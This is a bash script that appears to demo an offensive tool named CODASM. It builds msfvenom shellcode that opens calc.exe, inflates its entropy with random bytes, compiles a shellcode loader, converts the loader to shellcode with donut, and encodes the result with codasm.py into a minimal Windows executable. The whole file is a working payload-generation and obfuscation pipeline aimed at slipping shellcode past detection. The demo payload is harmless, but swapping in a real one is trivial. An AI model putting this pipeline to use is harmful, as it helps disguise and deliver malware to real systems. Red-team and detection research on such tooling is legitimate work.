#!/bin/bash
set -e

# Requires: msfvenom, ccd, ent, mingw-w64

# Point to your donut instance
DONUT="/mnt/c/Tools/donut_v1.0-linux"

WD=$PWD
START=$(date +%s.%N)

# Prepare demo files
#TWD=$(mktemp -d)
TWD="$WD/temp"
mkdir -p "$TWD"
echo "[1] Copying demo files to $TWD..." 
cp *.* "$TWD/"

cd $TWD
# 1. Create the payload file
echo ""
echo "[2] Creating popcalc shellcode using msfvenom..."
msfvenom --platform windows --arch x64 -e x64/xor -p windows/x64/exec CMD=calc.exe -b '\x00\x0A\x0D' -f raw -o popcalc.bin > /dev/null 2>&1
ls -la popcalc.bin
ent popcalc.bin | grep Entropy

echo ""
echo "[3] Appending random bytes to payload file to increase size & entropy..."
dd if=/dev/urandom bs=1k count=250 of=random.bin > /dev/null 2>&1
cat random.bin >> popcalc.bin
ls -la popcalc.bin
ent popcalc.bin | grep Entropy

echo ""
echo "[4] Converting shellcode to C header..."
xxd -i -n buf popcalc.bin popcalc.h
ls -la popcalc.h

echo ""
echo "[5] Compiling basic loader..."
x86_64-w64-mingw32-gcc -w -m64 -Wall -s -O2 -Os -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -fno-keep-inline-dllexport -Wl,--gc-sections -Wno-missing-braces  -Wl,-subsystem,windows -masm=intel "$TWD/demo.c" -o "$TWD/demo.exe"  > /dev/null
ls -la demo.exe
ent demo.exe | grep Entropy
file demo.exe

echo ""
echo "[6] Generating shellcode using donut..."
cd "$DONUT"
./donut -i "$TWD/demo.exe" -o "$TWD/demo.bin" -y 0 -z 2 > /dev/null
cd "$TWD/"
ls -la demo.bin
ent demo.bin | grep Entropy

echo "[+] Shellcode created!"

# Invoke CODASM
cd "$WD/.."
echo ""
echo "[7] Running CODASM - this might take a while..."
python3 codasm.py -i "$TWD/demo.bin" -oc "$TWD/codasm_decoder.h" -op "$TWD/codasm_payload.h" --rng 0 -vbch 0.9 -v 2>&1 >/dev/null | grep Encoded

cd "$TWD"
ls -la codasm_payload.h

echo ""
echo "[8] Compiling minimal CODASM executable..."
x86_64-w64-mingw32-gcc -w -m64 -Wall -s -O2 -Os -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -fno-keep-inline-dllexport -Wl,--gc-sections -Wno-missing-braces  -Wl,-subsystem,windows -masm=intel "$TWD/codasm.c" -o "$TWD/codasm.exe"
#strip --strip-unneeded "$TWD/codasm.exe"
#cp "$TWD/codasm.exe" "$WD"
ls -la codasm.exe
ent codasm.exe | grep Entropy

echo ""
echo "[9] Cleaning up temporary files..."
#rm -rf "$TWD"

END=$(date +%s.%N)
DIFF=$(printf "%.1f\n" $( bc -l <<< "$END - $START" ))
#DIFF=$(echo "scale=1; $END - $START" | bc)

echo ""
echo "[+] Done in $DIFF s!"